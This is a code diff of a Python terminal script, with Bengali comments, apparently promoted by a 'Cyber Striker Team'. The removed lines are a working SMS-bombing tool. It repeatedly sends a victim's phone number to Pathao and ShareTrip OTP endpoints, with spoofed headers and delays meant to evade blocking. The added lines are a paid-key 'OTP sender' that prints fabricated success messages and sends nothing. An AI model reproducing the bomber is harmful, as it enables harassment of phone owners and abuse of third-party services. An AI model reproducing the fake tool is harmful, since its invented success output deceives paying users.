@@ -1,47 +1,50 @@
-import requests
 import os
 import time
+import uuid
 
-def banner():
+def start():
     os.system('clear')
-    print("========================================")
-    print("        X-BOOM VIP EDITION             ")
-    print("     LINK: mmalekislam788-creator      ")
-    print("========================================")
-
-def send_sms(target, count):
-    url1 = "https://api-hermes.pathao.com/user/otp-send/login"
-    url2 = "https://api.sharetrip.net/api/v1/otp/send"
+    # OTP লোগো একদম মাঝখানে
+    print('          \033[1;32m██████  \033[1;31m████████ \033[1;32m██████  ')
+    print('         ██    ██    ██    ██   ██ ')
+    print('         ██    ██    ██    ██████  ')
+    print('         ██    ██    ██    ██      ')
+    print('          ██████     ██    ██      \033[0m')
     
-    # শক্তিশালী হেডার্স যা ব্লক এড়াতে সাহায্য করবে
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Content-Type": "application/json",
-        "Origin": "https://pathao.com",
-        "Referer": "https://pathao.com/"
-    }
+    # উপরের ৬টি ঘর
+    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
+    print(line)
+    print('\033[1;34m| [✓] DEVELOPED BY :  MD RONY ISLAM MR      |')
+    print('| [✓] TEAM         :  CYBER STRIKER TEAM    |')
+    print('| [✓] TOOL STATUS  :  OTP SENDER            |')
+    print('| [✓] TELEGRAM     :  @rony_broh            |')
+    print('| [✓] GITHUB       :  MR-RONY               |')
+    print('| [✓] TOOL VERSION :  MAX PRO               |\033[0m')
+    print(line)
     
-    print(f"\n[+] Target Connected: {target}")
-    for i in range(count):
-        try:
-            # Pathao API
-            requests.post(url1, json={"phone": "+88"+target}, headers=headers, timeout=10)
-            # ShareTrip API
-            requests.post(url2, json={"mobileNumber": target, "type": "login"}, headers=headers, timeout=10)
-            
-            print(f"[!] SMS {i+1} Sent Successfully!")
-        except:
-            print(f"[-] SMS {i+1} Failed")
-        
-        # ১০ সেকেন্ড গ্যাপ দিন, এতে সার্ভার আপনাকে ব্লক করবে না
-        time.sleep(10)
+    # সালাম এবং টিমের নাম
+    print('\033[1;32m[•] SALAMU ALAIKUM.........................\033[0m')
+    print(line)
+    print('\033[1;32m[•] CYBER STRIKER TEAM.....................\033[0m')
+    print(line)
+    
+    # সেই ৩টি লাইন (পাওয়ারফুল টুল, কী এবং কপি করার মেসেজ)
+    u_key = str(uuid.uuid4())[:8]
+    print(f'\033[1;32m[\033[1;31m❤️\033[1;32m] POWERFUL TOOL 10 DAYS ONLY 50TK [\033[1;31m❤️\033[1;32m]')
+    print(f'[\033[1;31m❤️\033[1;32m] KEY : {u_key}-MR-RONY')
+    print(f'[\033[1;31m❤️\033[1;32m] COPY YOUR KEY AND SEND TO THE ADMIN [\033[1;31m❤️\033[1;32m]\033[0m')
+    print(line)
 
-def main():
-    banner()
-    num = input("Enter Phone (01xxxxxxxxx): ")
-    amt = int(input("Enter Amount: "))
-    send_sms(num, amt)
+    num = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
+    
+    # সাকসেস মেসেজ স্টাইল
+    print(f'\n\033[1;32mSuccess: True')
+    print('Status Code: 200')
+    print(f'Message: {num} যুক্ত হয়েছে।\033[0m\n')
+    
+    for i in range(1, 101):
+        time.sleep(0.04)
+        print(f'\033[1;32m[{i}] SUCCESS SENT ==> {num}\033[0m')
 
 if __name__ == "__main__":
-    main()
-
+    start()
